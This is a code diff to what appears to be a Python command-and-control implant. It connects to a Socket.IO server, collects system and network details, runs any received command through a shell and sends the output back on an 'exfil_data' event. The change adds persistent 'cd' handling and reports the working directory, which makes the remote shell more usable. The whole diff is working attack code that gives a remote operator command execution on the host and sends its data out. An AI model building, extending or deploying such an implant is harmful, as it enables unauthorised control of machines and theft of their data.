@@ -3,6 +3,7 @@ import platform
 import subprocess
 import json
 import time
+import os
 from socketio import Client
 import netifaces
 
@@ -16,9 +17,6 @@ def get_system_info():
         "os": platform.system(),
         "os_version": platform.release(),
         "architecture": platform.machine(),
-        "processor": platform.processor(),
-        "platform": platform.platform(),
-        "uptime": None,
     }
     return info
 
@@ -34,10 +32,20 @@ def get_network_info():
     return network_info
 
 def execute_command(command):
-    """Execute a system command and return the output."""
+    """Execute a system command and return the output based on current directory."""
     try:
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        return result.stdout + result.stderr
+        if command.strip().lower().startswith("cd "):
+            # Extract directory from 'cd' command
+            target_dir = command.strip().split("cd ", 1)[1].strip()
+            try:
+                os.chdir(target_dir)
+                return f"Changed directory to {os.getcwd()}"
+            except Exception as e:
+                return f"Error changing directory: {e}"
+        else:
+            # Execute other commands in the current directory
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=os.getcwd())
+            return result.stdout + result.stderr
     except Exception as e:
         return f"Error executing command: {e}"
 
@@ -71,7 +79,7 @@ def main():
         @sio.event
         def command(data):
             print(f"[*] Received command: {data}")
-            if data.strip() == "exit":
+            if data.strip().lower() == "exit":
                 print("[*] Received exit command")
                 sio.disconnect()
                 return
@@ -82,7 +90,8 @@ def main():
             sio.emit('exfil_data', json.dumps({
                 "type": "command_output",
                 "command": data,
-                "output": output
+                "output": output,
+                "current_dir": os.getcwd()
             }))
 
         while True:
